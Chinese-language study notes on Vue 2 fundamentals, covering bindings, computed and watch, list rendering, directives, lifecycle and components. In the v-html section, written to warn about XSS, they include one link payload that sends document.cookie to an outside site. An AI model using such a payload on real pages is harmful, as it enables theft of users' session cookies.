# 实例

- [实例](#实例)
  - [Hello world](#hello-world)
  - [模板语法](#模板语法)
  - [数据绑定](#数据绑定)
  - [el 和 data 的两种写法](#el-和-data-的两种写法)
  - [MVVM模型](#mvvm模型)
  - [Object.defineProperty](#objectdefineproperty)
  - [数据代理](#数据代理)
  - [事件1](#事件1)
  - [事件修饰符](#事件修饰符)
  - [键盘事件](#键盘事件)
  - [计算属性(姓名案例)](#计算属性姓名案例)
  - [天气案例](#天气案例)
  - [监视属性watch](#监视属性watch)
  - [watch实现姓名案例](#watch实现姓名案例)
  - [绑定样式](#绑定样式)
  - [条件渲染](#条件渲染)
  - [列表渲染](#列表渲染)
  - [key的原理](#key的原理)
  - [列表过滤](#列表过滤)
    - [watch写法](#watch写法)
    - [computed写法](#computed写法)
  - [模拟监视对象](#模拟监视对象)
  - [vm.$set(), Vue.set()](#vmset-vueset)
  - [数据监测-数组](#数据监测-数组)
  - [总结 || 数据劫持](#总结--数据劫持)
  - [收集表单数据](#收集表单数据)
  - [过滤器](#过滤器)
  - [内置指令](#内置指令)
  - [自定义指令](#自定义指令)
  - [生命周期](#生命周期)
  - [组件](#组件)
  - [组件注意点](#组件注意点)
  - [组件的嵌套](#组件的嵌套)
  - [VueComponent](#vuecomponent)
  - [VueComponent和Vue](#vuecomponent和vue)

## Hello world

1. Vue实例和容器是**一一对应**的；
2. 真实开发中只有一个Vue实例，并且会配合着组件一起使用；
3. {{xxx}}中的xxx要写**js表达式**，且xxx可以自动读取到data中的所有属性；
4. 一旦data中的数据发生改变，那么页面中用到该数据的地方也会自动更新；

```html
    <div id="root">
        <h1>Hello,{{content}}</h1>
    </div>

    <script>
        new Vue({
            el: "#root",
            data: {
                content: "logLoveVv"
            }
        })
    </script>
```

⭐=⭐

- 实例对象?![20230201000547](https://raw.githubusercontent.com/Logible/Image/main/note_image/20230201000547.png)

1. 使用构造函数用new关键字创建对象时, 获取到的对象为实例对象
2. new命令执行时，构造函数内部的this，就代表了新生成的实例对象

- new命令的原理⭐⭐⭐

![20230202135840](https://raw.githubusercontent.com/Logible/Image/main/note_image/20230202135840.png)

## 模板语法

```html
    <div id="root">
        <h1>插值语法</h1>
        <div>Hello,{{name}}</div>
        <hr/>
        <h1>指令语法</h1>
        <a v-bind:href="school.url">
            点我去{{school.name}}学习
        </a>
    </div>

    <script>
        new Vue({
            el: "#root",
            data: {
                name: "log",
                school:{
                    url:"http://www.baidu.com",
                    name:"GPNU"
                }
            }
        })
    </script>
```

## 数据绑定

```html
    <div id="root">
        单向数据绑定: <input type="text" v-bind:value="name"> <br/>
        双向数据绑定: <input type="text" v-model:value="name"> <br/>

        <!-- 简写 -->

        单向数据绑定: <input type="text" :value="name"> <br/>
        双向数据绑定: <input type="text" v-model="name"> <br/>
    </div>
```

## el 和 data 的两种写法

⭐⭐⭐⭐

用户代码片段

```html
    <div id="root">
        <h1>hello,{{name}}</h1>
    </div>

    <script>
        const v = new Vue({
            // el:"#root",
            //data第二种写法 函数式
            data:function(){
                return {
                    name:";PGG"
                }
            }
        })

        setTimeout(()=>{
            v.$mount('#root');
        },1000)
```

## MVVM模型

<image style="height:300px; background-color:#CDDEC2" src="https://raw.githubusercontent.com/Logible/Image/main/note_image/20230202165901.png"/>

<image style="height:300px; background-color:#CDDEC2" src="https://raw.githubusercontent.com/Logible/Image/main/note_image/20230202170022.png"/>

## Object.defineProperty

```js
let number = 18;
let person = {
    name: "Log",
    sex: "male"
}

Object.defineProperty(person, 'age', {
    // value:18,
    // enumerable:true, //控制属性是否可以枚举，默认值是false
    // writable:true, //控制属性是否可以被修改，默认值是false
    // configurable:true //控制属性是否可以被删除，默认值是false
    //当有人读取person的age属性时，get函数(getter)就会被调用，且返回值就是age的值
    get(){
        console.log("sb invoke me");
        return number;
    },
    set(value){
        console.log('sb modify me');
        number = value;
    }
})
```

## 数据代理

```js
// 数据代理: 通过一个对象代理另一个对象中属性的操作(读/写)
let obj = {x:100}
let obj2 = {y:100}

Object.defineProperty(obj2,'x',{
    get(){
        return obj.x;
    },
    set(value){
        obj.x = value
    }
})
```

- name和address代理_data中的数据

![20230203014337](https://raw.githubusercontent.com/Logible/Image/main/note_image/20230203014337.png)

## 事件1

```html
    <div id="root">
        <button v-on:click="showInfo">点我提示信息</button>
        <button @click="showInfo2($event,66)">点我提示信息2</button>
    </div>

    <script>
        const vm = new Vue({
            el:'#root',
            methods:{
                showInfo(){
                    alert("提示信息廖");
                },
                showInfo2(event,number){
                    console.log(event,number);
                }
            }
        })
    </script>
```

## 事件修饰符

```html
    <div id="root">
        <h2>欢迎{{name}}学习</h2>
        <!-- 阻止事件默认行为 -->
        <a :href="url" @click.prevent="showInfo">I am a link</a>

        <!-- 阻止事件冒泡（常用） -->
        <div class="demo1" @click="showInfo">
            <button @click.stop="showInfo">pick me</button>
        </div>

        <!-- 事件只触发一次（常用） -->
        <button @click.once="showInfo">点我提示信息</button>

        <!-- 使用事件的捕获模式 -->
        <div class="box1" @click.capture="showMsg(1)">
            div1
            <div class="box2" @click.capture="showMsg(2)">
                div2
            </div>
        </div>

        <!-- 该元素是当前操作元素才触发 -->
        <div class="demo1" @click.self="showInfo">
            <button>点我不触发</button>
        </div>

        <!-- 事件的默认行为立即执行，无需等待事件回调执行完毕； -->
        <ul @wheel.passive="wheel" class="list">
            <li>1</li>
            <li>2</li>
            <li>3</li>
            <li>4</li>
        </ul>

    </div>
```

## 键盘事件

```html
<!-- 
		1.Vue中常用的按键别名：
					回车 => enter
					删除 => delete (捕获“删除”和“退格”键)
					退出 => esc
					空格 => space
					换行 => tab (特殊，必须配合keydown去使用)
					上 => up
					下 => down
					左 => left
					右 => right

		2.Vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意要转为kebab-case（短横线命名）

		3.系统修饰键（用法特殊）：ctrl、alt、shift、meta
					(1).配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发。
					(2).配合keydown使用：正常触发事件。

		4.也可以使用keyCode去指定具体的按键（不推荐）

		5.Vue.config.keyCodes.自定义键名 = 键码，可以去定制按键别名
-->
<!-- 准备好一个容器-->
<div id="root">
    <h2>欢迎{{name}}学习</h2>
    <input @keyup.caps-lock="showInfo($event)" type="text" placeholder="按下回车键提示信息" name="" id="">
</div>
```

```js
methods: {
    showInfo(e) {
        // console.log(e.key,e.keyCode)
        console.log(e.target.value)
    }
}
```

## 计算属性(姓名案例)

```html
<div id="root">
    <!-- 插值语法实现 -->
    <input type="text" v-model="firstname"><br/><br/>
    <input type="text" v-model="lastname">
    <h2>Your name is {{firstname}}-{{lastname}}</h2>
</div>

<!-- data中的数据发生改变, 模板就会重新解析 -->
<div id="root">
    <!-- methods实现 -->
    <input type="text" v-model="firstname"><br/><br/>
    <input type="text" v-model="lastname">
    <h2>Your name is {{fullname()}}</h2>
</div>
```

```html
<!-- 
		计算属性：
				1.定义：要用的属性不存在，要通过已有属性计算得来。
				2.原理：底层借助了Objcet.defineproperty方法提供的getter和setter。
				3.get函数什么时候执行？
							(1).初次读取时会执行一次。
							(2).当依赖的数据发生改变时会被再次调用。
				4.优势：与methods实现相比，内部有缓存机制（复用），效率更高，调试方便。
				5.备注：
						1.计算属性最终会出现在vm上，直接读取使用即可。
						2.如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据发生改变。
-->
<!-- 准备好一个容器-->
<div id="root">
    <!-- methods实现 -->
    性: <input type="text" v-model="firstname"><br /><br />
    名: <input type="text" v-model="lastname">
    <h2>Your name is {{fullname}}</h2>
</div>
```

```js
computed:{
    fullName:{
        //get有什么作用？当有人读取fullName时，get就会被调用，且返回值就作为fullName的值
        //get什么时候调用？1.初次读取fullName时。2.所依赖的数据发生变化时。
        get(){
            console.log('get被调用了')
            // console.log(this) //此处的this是vm
            return this.firstName + '-' + this.lastName
        },
        //set什么时候调用? 当fullName被修改时。
        set(value){
            console.log('set',value)
            const arr = value.split('-')
            this.firstName = arr[0]
            this.lastName = arr[1]
        }
    }
}

// 简写
computed: {
    fullname(){
        return this.firstname + this.lastname;
    }
}
```

## 天气案例

```html
<div id="root">
    <h2>Today's weather is {{ishot===true?'hot':'cool'}}</h2>
    <button @click="changeWeather">changeWeather</button>
    <!-- 简写法 -->
    <button @click="ishot = !ishot">changeWeather2</button>
</div>

<script>
    const vm = new Vue({
        el: '#root',
        data: {
            ishot:true,
        },
        methods: {
            changeWeather(){
                this.ishot = !this.ishot
            }
        }
    })
</script>
```

## 监视属性watch

1. 当被监视的属性变化时, 回调函数自动调用, 进行相关操作
2. 监视的属性必须存在，才能进行监视！！
3. 监视的两种写法：
    1. new Vue时传入watch配置
    1. 通过vm.$watch监视

```js
watch:{
    ishot:{
        immediate:true,
        handler(newValue,oldValue){
            console.log('ishot were change, oldValue:',oldValue,'newValue',newValue)
        }
    }
}

vm.$watch('ishot',{
    immediate:true,
    handler(newValue,oldValue){
        console.log('ishot were change, oldValue:',oldValue,'newValue',newValue)
    }
})

// 简写
watch: {
    ishot(newValue, oldValue) {
        console.log('ishot were change, oldValue:', oldValue, 'newValue', newValue)
    }
}

vm.$watch('ishot', function (newValue, oldValue) {
console.log('ishot were change, oldValue:', oldValue, 'newValue', newValue)
})
```

- 深度监视

```js
data: {
    numbers:{
        a:100,
        b:200
    }
},
watch:{
    numbers:{
        deep:true,
        handler(newValue,oldValue){
            console.log('numbers were change, oldValue:',oldValue,'newValue',newValue)
        }
    }
}
```

## watch实现姓名案例

- computed和watch之间的区别：

1. computed能完成的功能，watch都可以完成。
2. watch能完成的功能，computed不一定能完成，例如：watch可以进行异步操作。
3. 两个重要的小原则：
    1. 所被Vue管理的函数，最好写成普通函数，这样this的指向才是vm 或 组件实例对象。
    2. 所有不被Vue所管理的函数（定时器的回调函数、ajax的回调函数等、Promise的回调函数），最好写成箭头函数，

```js
data: {
    ishot: true,
    firstName:'shit',
    lastName:'log',
    fullName:'shitlog'
},

watch: {
    firstName(value) {
        console.log("firstName was changed");
        setTimeout(() => {
            this.fullName = value + this.lastName;    
        }, 1000);
    },
    lastName(value) {
        console.log("lastName was changed");
        this.fullName = this.firstName+ value;
    }
}
```

## 绑定样式

```html
<div id="root">
    <!-- 绑定class样式--字符串写法，适用于：样式的类名不确定，需要动态指定 -->
    <div class="basic" :class="mood" @click="changeMood">{{name}}</div> <br/><br/>

    <!-- 绑定class样式--数组写法，适用于：要绑定的样式个数不确定、名字也不确定 -->
    <div class="basic" :class="classArr">{{name}}</div> <br/><br/>

    <!-- 绑定class样式--对象写法，适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用 -->
    <div class="basic" :class="classObj">{{name}}</div> <br/><br/>

    <!-- 绑定style样式--对象写法 -->
    <div class="basic" :style="styleObj">{{name}}</div> <br/><br/>
    <!-- 绑定style样式--数组写法 -->
    <div class="basic" :style="styleArr">{{name}}</div>
</div>
```

```js
data:{
    name:'尚硅谷',
    mood:'normal',
    classArr:['atguigu1','atguigu2','atguigu3'],
    classObj:{
        atguigu1:false,
        atguigu2:false,
    },
    styleObj:{
        fontSize: '40px',
        color:'red',
    },
    styleObj2:{
        backgroundColor:'orange'
    },
    styleArr:[
        {
            fontSize: '40px',
            color:'blue',
        },
        {
            backgroundColor:'gray'
        }
    ]
},
methods: {
    changeMood(){
        const arr = ['happy','sad','normal']
        const index = Math.floor(Math.random()*3)
        this.mood = arr[index]
    }
},
```

## 条件渲染

- 条件渲染：

1. v-if
    - 写法：
        - 1).v-if="表达式"
        - 2).v-else-if="表达式"
        - 3).v-else="表达式"
    - 适用于：切换频率**较低**的场景。
    - 特点：不展示的DOM元素直接被移除。
    - 注意：v-if可以和:v-else-if、v-else一起使用，但要求结构不能被“打断”。

2. v-show
    - 写法：v-show="表达式"
    - 适用于：切换频率**较高**的场景。
    - 特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉

3. 备注：使用v-if的时，元素可能无法获取到，而使用v-show一定可以获取到。

```html
<div id="root">
    <h2 v-show="false">欢迎来到log小窝</h2>
    <h2 v-show="1===1">欢迎来到log小窝</h2>

    <h1 class="">当前的n值是{{number}}</h1>
    <button @click="number++">click number++</button>

    <div v-if="number === 1">Angular</div>
    <div v-else-if="number === 2">React</div>
    <div v-else-if="number === 3">Vue</div>
    <div v-else>Log love Vv forever</div>

    <template v-if="number === 1">
        <h2>你好</h2>
        <h2>Log</h2>
        <h2>潮州</h2>
    </template>
</div>
```

## 列表渲染

```js
data: {
    people: [
        { id: '001', name: '张三', age: 18 },
        { id: '002', name: '李四', age: 19 },
        { id: '003', name: '王五', age: 20 }
    ],
    car: {
        name: '奥迪A8',
        price: '70万',
        color: '黑色'
    },
    str: 'hello'
}
```

```html
<!-- 遍历数组 -->
<h2>人员列表（遍历数组）</h2>
<ul>
    <li v-for="(p,index) of people" :key="index">
        {{p.name}}-{{p.age}}
    </li>
</ul>

<!-- 遍历对象 -->
<h2>汽车信息（遍历对象）</h2>
<ul>
    <li v-for="(value,k) of car" :key="k">
        {{k}}-{{value}}
    </li>
</ul>

<!-- 遍历字符串 -->
<h2>测试遍历字符串（用得少）</h2>
<ul>
    <li v-for="(char,index) of str" :key="index">
        {{char}}-{{index}}
    </li>
</ul>

<!-- 遍历指定次数 -->
<h2>测试遍历指定次数（用得少）</h2>
<ul>
    <li v-for="(number,index) of 5" :key="index">
        {{index}}-{{number}}
    </li>
</ul>
```

⭐⭐⭐

for in and for of?

## key的原理

面试题：react、vue中的key有什么作用？（key的内部原理）

1. 虚拟DOM中key的作用：
   1. key是**虚拟DOM对象的标识**，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】, 随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下：

2. 对比规则：
   1. 旧虚拟DOM中找到了与新虚拟DOM相同的key：
      1. 若虚拟DOM中内容**没变**, 直接使用之前的真实DOM！
      2. 若虚拟DOM中内容**变了**, 则生成新的真实DOM，随后替换掉页面中之前的真实DOM。
   2. 旧虚拟DOM中未找到与新虚拟DOM相同的key
      1. 创建新的真实DOM，随后渲染到到页面。

3. 用index作为key可能会引发的问题
   1. 若对数据进行：**逆序添加、逆序删除**等破坏顺序操作:
      1. 会产生没有必要的真实DOM更新 ==> 界面效果没问题, 但效率低
   2. 如果结构中还包含输入类的DOM
      1. 会产生**错误DOM更新** ==> 界面有问题。

4. 开发中如何选择key?:
   1. 最好使用每条数据的唯一标识作为key, 比如id、手机号、身份证号、学号等唯一值
   2. 如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，使用index作为key是没有问题的。

## 列表过滤

### watch写法

```js
data: {
    people: [
        { id: '001', name: '马冬梅', age: 19, sex: '女' },
        { id: '002', name: '周冬雨', age: 20, sex: '女' },
        { id: '003', name: '周杰伦', age: 21, sex: '男' },
        { id: '004', name: '温兆伦', age: 22, sex: '男' }
    ],
    keyWord:'',
    filPeople: [],
},
watch: {

    // keyWord(val){
    //     this.filPeople = this.people.filter((p)=>{
    //         return p.name.indexOf(val) !== -1;
    //     })
    // },

    keyWord: {
        immediate: true,
        handler(val) {
            this.filPeople = this.people.filter((p) => {
                return p.name.indexOf(val) !== -1
            })
        }
    }
}
```

### computed写法

```js
computed: {
    filPeople() {
        return this.filPeople = this.people.filter((p) => {
            return p.name.indexOf(this.keyWord) !== -1
        })
    }
}
```

升序

```js
computed: {
    filPeople() {
        const arr = this.filPeople = this.people.filter((p) => {
            return p.name.indexOf(this.keyWord) !== -1
        })
        if(this.sortType){
            arr.sort((a,b)=>{
                //返回值>0, 即升序
                return this.sortType===1? a.age-b.age: b.age-a.age;
            })
        }
        return arr
    }
}
```

## 模拟监视对象

```js
let data = {
        name:'尚硅谷',
        address:'北京',
    }

//创建一个监视的实例对象，用于监视data中属性的变化
const obs = new Observer(data)
console.log(obs)

//准备一个vm实例对象
let vm = {}
//⭐⭐⭐为什么data也要赋值成obs
vm._data = data = obs

function Observer(obj){
    //汇总对象中所有的属性形成一个数组
    const keys = Object.keys(obj)
    //遍历
    keys.forEach((k)=>{
        Object.defineProperty(this,k,{
            get(){
                return obj[k]
            },
            set(val){
                console.log(`${k}被改了，我要去解析模板，生成虚拟DOM.....我要开始忙了`)
                obj[k] = val
            }
        })
    })
}
```

## vm.$set(), Vue.set()

```js
methods: {
    addSex() {
        this.$set(this.student, 'sex', 'male');
        // Vue.set(this.student, 'sex', 'male');
    }
},
```

## 数据监测-数组

```js
// 不生效
vm.student.hobby[0]='shot';

// 生效
vm.student.hobby.push("shit");
Vue.set(vm.student.hobby,0,"fuckvv");
```

## 总结 || 数据劫持

Vue监视数据的原理：

1. vue会监视data中所有层次的数据。

2. 如何监测对象中的数据？

    - 通过setter实现监视，且要在new Vue时就传入要监测的数据。
      1. 对象中后追加的属性，Vue默认不做响应式处理
      2. 如需给后添加的属性做响应式，请使用如下API
         1. Vue.set(target，propertyName/index，value)
         2. vm.$set(target，propertyName/index，value)

3. 如何监测数组中的数据？

   - 通过包裹数组更新元素的方法实现，本质就是做了两件事：
      1. 调用原生对应的方法对数组进行更新。
      2. 重新解析模板，进而更新页面。

4. 在Vue修改数组中的某个元素一定要用如下方法：(监测方法-重写push方法)
   1. 使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()
   2. Vue.set() 或 vm.$set()

- 特别注意：Vue.set() 和 vm.$set() 不能给vm 或 vm的根数据对象 添加属性！！！

- 数据劫持

![20230206220229](https://raw.githubusercontent.com/Logible/Image/main/note_image/20230206220229.png)

- 一些例子

```js
addSex() {
    this.$set(this.student,"sex","男")
},
addFriend() {
    this.student.friends.unshift({'name':"vv",'age':29})
},
updateFirstFriendName() {
    // 修改第一个朋友的名字为张三
    this.student.friends[0].name = "张三"
    this.student.friends[0].age = 18
},
addHobby() {
    this.student.hobby.unshift("打game")
},
updateHobby() {
    // 不奏效写法
    // this.student.hobby[0] = "开车";
    this.student.hobby.splice('0',1,'开车车')
},
removeSmoke() {
    this.student.hobby = this.student.hobby.filter((item)=>{
        return item !='抽烟'
    })
}
```

## 收集表单数据

1. 若：`<input type="text"/>`，则v-model收集的是value值，用户输入的就是value值。
2. 若：`<input type="radio"/>`，则v-model收集的是value值，且要给标签配置value值。
3. 若：`<input type="checkbox"/>`
    1. 没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是布尔值）
    2. 配置input的value属性:
       - v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）
       - v-model的初始值是数组，那么收集的的就是value组成的数组
4. v-model的三个修饰符：
    1. lazy：失去焦点再收集数据
    2. number：输入字符串转为有效的数字
    3. trim：输入首尾空格过滤

```html
<form @submit.prevent="demo">
    账号：<input type="text" v-model.trim="userInfo.account"> <br/><br/>
    密码：<input type="password" v-model="userInfo.password"> <br/><br/>
    年龄：<input type="number" v-model.number="userInfo.age"> <br/><br/>
    性别：
    男<input type="radio" name="sex" v-model="userInfo.sex" value="male">
    女<input type="radio" name="sex" v-model="userInfo.sex" value="female"> <br/><br/>
    爱好：
    学习<input type="checkbox" v-model="userInfo.hobby" value="study">
    打游戏<input type="checkbox" v-model="userInfo.hobby" value="game">
    吃饭<input type="checkbox" v-model="userInfo.hobby" value="eat">
    <br/><br/>
    所属校区
    <select v-model="userInfo.city">
        <option value="">请选择校区</option>
        <option value="beijing">北京</option>
        <option value="shanghai">上海</option>
        <option value="shenzhen">深圳</option>
        <option value="wuhan">武汉</option>
    </select>
    <br/><br/>
    其他信息：
    <textarea v-model.lazy="userInfo.other"></textarea> <br/><br/>
    <input type="checkbox" v-model="userInfo.agree">阅读并接受<a href="http://www.atguigu.com">《用户协议》</a>
    <button>提交</button>
</form>
```

```js
data:{
    userInfo:{
        account:'',
        password:'',
        age:18,
        sex:'female',
        hobby:[],
        city:'beijing',
        other:'',
        agree:''
    }
},
methods: {
    demo(){
        console.log(JSON.stringify(this.userInfo))
    }
}
```

## 过滤器

1. 定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）。
2. 语法：
   1. 注册过滤器：Vue.filter(name,callback) 或 new Vue{filters:{}}
   2. 使用过滤器：{{ xxx | 过滤器名}}  或  v-bind:属性 = "xxx | 过滤器名
3. 备注：
   1. 过滤器也可以接收额外参数、多个过滤器也可以串联
   2. 并没有改变原本的数据, 是产生新的对应的数据

```html
<h2>显示格式化后的时间</h2>
<!-- 计算属性实现 -->
<h3>现在是：{{fmtTime}}</h3>
<!-- methods实现 -->
<h3>现在是：{{getFmtTime()}}</h3>
<!-- 过滤器实现 -->
<h3>现在是：{{time | timeFormater}}</h3>
<!-- 过滤器实现（传参） -->
<h3>现在是：{{time | timeFormater('YYYY_MM_DD') | mySlice}}</h3>
```

```js
data:{
    time:1621561377603, //时间戳
    msg:'你好，尚硅谷'
},
computed: {
    fmtTime(){
        return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
    }
},
methods: {
    getFmtTime(){
        return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
    }
},
//局部过滤器

filters:{
    timeFormater(value,str='YYYY年MM月DD日 HH:mm:ss'){
        // console.log('@',value)
        return dayjs(value).format(str)
    }
}

//全局过滤器
Vue.filter('mySlice',function(value){
    return value.slice(0,4)
})
```

## 内置指令

- v-text

```html
{name:"shit"}
<div v-text="name">I am shit</div>
<!-- shit -->
```

- v-html指令：

1. 作用：向指定节点中渲染包含html结构的内容。
2. 与插值语法的区别：
    1. v-html会替换掉节点中所有的内容，{{xx}}则不会。
    2. v-html可以识别html结构。
3. 严重注意：v-html有安全性问题
   1. 在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
   2. 一定要在可信的内容上使用v-html，永不要用在用户提交的内容上

```js
str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>'
```

- v-cloak指令（没有值）：

    1. 本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。
    2. 使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}}的问题

```css
[v-cloak]{
    display:none;
}
```

```html
<div id="root">
    <h2 v-cloak>{{name}}</h2>
</div>
```

- v-once

```html
<div id="root">
    <!-- 初次动态渲染 -->
    <h2 v-once>{{number}}</h2>
    <h2>{{number}}</h2>
    <button @click="number++">点我number++</button>
</div>
```

- v-pre

    1. 跳过其所在节点的编译过程。
    2. 可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。

## 自定义指令

- 定义语法：

    (1).局部指令

    (2).全局指令

- 配置对象中常用的3个回调：

    (1).bind：指令与元素成功绑定时调用。

    (2).inserted：指令所在元素被插入页面时调用。

    (3).update：指令所在模板结构被重新解析时调用。
- 备注：

    1.指令定义时不加v-，但使用时要加v-；

    2.指令名如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名。

```html
<div id="root">
    <h2>{{name}}</h2>
    <h2>当前的n值是：<span v-text="n"></span> </h2>
    <!-- <h2>放大10倍后的n值是：<span v-big-number="n"></span> </h2> -->
    <h2>放大10倍后的n值是：<span v-big="n"></span> </h2>
    <button @click="n++">点我n+1</button>
    <hr/>
    <input type="text" v-fbind:value="n">
</div>
```

```js
directives: {
    big(element, binding) {
        element.innerText = "放大10倍后的n值是：" + binding.value;
    },
    fbind: {
        bind(element, binding) {
            element.value = binding.value
        },
        inserted(element, binding) {
            element.focus();
        },
        update(element, binding) {
            element.value = binding.value

            //⭐⭐⭐点解不生效
            this.$nextTick(()=>{
                this.$refs.inputTitle.focus()
            })
        }
    }
}
```

全局

```js
//定义全局指令
Vue.directive('fbind', {
    //指令与元素成功绑定时（一上来）
    bind(element, binding) {
        element.value = binding.value
    },
    //指令所在元素被插入页面时
    inserted(element, binding) {
        element.focus()
    },
    //指令所在的模板被重新解析时
    update(element, binding) {
        element.value = binding.value
    }
})

Vue.directive('big', function(element, binding) {
    element.innerText = "放大10倍后的n值是：" + binding.value * 10;
})
```

## 生命周期

![生命周期](https://raw.githubusercontent.com/Logible/Image/main/note_image/生命周期.png)

1. 又名：生命周期回调函数、生命周期函数、生命周期钩子。
2. 是什么：Vue在关键时刻帮我们调用的一些特殊名称的函数。
3. 生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的。
4. 生命周期函数中的this指向是vm 或 组件实例对象。

```js
mounted() {
    setInterval(() => {
        this.opacity -= 0.01;
        if (this.opacity <= 0)
            this.opacity = 1;
    }, 16);
},
```

- 常用的生命周期钩子：

    1. mounted: 发送ajax请求、启动定时器、绑定自定义事件、订阅消息等【初始化操作】。
    2. beforeDestroy: 清除定时器、解绑自定义事件、取消订阅消息等【收尾工作】。

- 关于销毁Vue实例

    1. 销毁后借助Vue开发者工具看不到任何信息。
    2. 销毁后自定义事件会失效，但原生DOM事件依然有效。
    3. 一般不会在beforeDestroy操作数据，因为即便操作数据，也不会再触发更新流程了

```js
methods: {
    stop(){
        this.$destroy()
    }
},
//Vue完成模板的解析并把初始的真实DOM元素放入页面后（挂载完毕）调用mounted
mounted(){
    console.log('mounted',this)
    this.timer = setInterval(() => {
        console.log('setInterval')
        this.opacity -= 0.01
        if(this.opacity <= 0) this.opacity = 1
    },16)
},
beforeDestroy() {
    clearInterval(this.timer)
    console.log('vm即将驾鹤西游了')
},
```

## 组件

组件的定义——实现应用中**局部**功能**代码和资源**的集合

- Vue中使用组件的三大步骤：

   1. 定义组件(创建组件)
   2. 注册组件
   3. 使用组件(写组件标签)

- 如何定义一个组件？
  - 使用Vue.extend(options)创建，其中options和new Vue(options)时传入的那个options几乎一样，但也有点区别；
  - 区别如下：
    1. el不要写，为什么？ ——— 最终所有的组件都要经过一个vm的管理，由vm中的el决定服务哪个容器。
    2. data必须写成函数，为什么？ ———— 避免组件被复用时，数据存在引用关系。
  - 备注：使用template可以配置组件结构。

- 如何注册组件？
    1. 局部注册：靠new Vue的时候传入components选项
    2. 全局注册：靠Vue.component('组件名',组件)

- 编写组件标签

```js
//创建组件
const hello = Vue.extend({
    template:`
        <h2>{{content}}</h2>
    `,
    data(){
        return {
            content:"The future is fuzzy"
        }
    }
})

//全局注册组件
Vue.component('hello',hello)

//局部注册组件
const vm = new Vue({
    el: '#root',
    components: {
        school,
        student,
    }
})
```

## 组件注意点

1. 关于组件名:

    1. 一个单词组成：
        - 第一种写法(首字母小写)：school
        - 第二种写法(首字母大写)：School
    2. 多个单词组成：
        - 第一种写法(kebab-case命名)：my-school
        - 第二种写法(CamelCase命名)：MySchool (需要Vue脚手架支持)
    3. 备注：
        - 组件名尽可能回避HTML中已有的元素名称，例如：h2、H2都不行。
        - 可以使用name配置项指定组件在开发者工具中呈现的名字。

2. 关于组件标签:
   1. 第一种写法：`<school></school>`
   2. 第二种写法：`<school/>`
   3. 备注：
      1. 不用使用脚手架时，`<school/>`会导致后续组件不能渲染。

3. 一个简写方式：
   1. const school = Vue.extend(options) 可简写为：const school = options

## 组件的嵌套

![20230208213203](https://raw.githubusercontent.com/Logible/Image/main/note_image/20230208213203.png)

```js
const student = {
    template:`
    <h2>I am a shit student</h2>
    `
}

const school = {
    template: `
    <div>
        <h2>
            Welcome to {{address}} to study - {{name}}
            my dearest student
            <student/>
        </h2>
    </div>
    `,
    data() {
        return {
            name: "GPNU",
            address: "广州"
        }
    },
    components:{
        student
    }
}

const hello = {
    template:`
    <div>
        <h2>{{msg}}</h2>
    </div>`,
    data(){
        return {
            msg:"I say Hello ~"
        }
    }
}

const app = Vue.extend({
    template:`
        <div>
            <school></school>
            <hello></hello>
        </div>`,
    components:{
        school,
        hello
    }
})

const vm = new Vue({
    el: '#root',
    template:'<app></app>',
    components: {
        app
    }
})
```

## VueComponent

1. school组件本质是一个名为VueComponent的构造函数，且不是程序员定义的，是Vue.extend生成的。

2. 我们只需要写`<school/>`或`<school></school>`，Vue解析时会帮我们创建school组件的实例对象，
   1. 即Vue帮我们执行的：new VueComponent(options)。

3. 特别注意：每次调用Vue.extend，返回的都是一个全新的VueComponent！

4. 关于this指向：
    1. 组件配置中：data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【VueComponent实例对象】。
    2. new Vue(options)配置中：data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【Vue实例对象】。

## VueComponent和Vue

![20230208231207](https://raw.githubusercontent.com/Logible/Image/main/note_image/20230208231207.png)

1. 一个重要的内置关系：`VueComponent.prototype.__proto__ === Vue.prototype`
2. 为什么要有这个关系：让组件实例对象(vc)可以访问到 Vue原型上的属性、方法
